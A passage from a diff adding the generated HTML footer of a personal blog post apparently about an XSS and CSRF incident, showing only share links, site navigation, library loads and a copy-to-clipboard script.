+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/&title=一场XSS和CSRF引发的血案"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/&title=一场XSS和CSRF引发的血案"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/&name=一场XSS和CSRF引发的血案&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/&t=一场XSS和CSRF引发的血案"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2024
+    psych
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Article</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
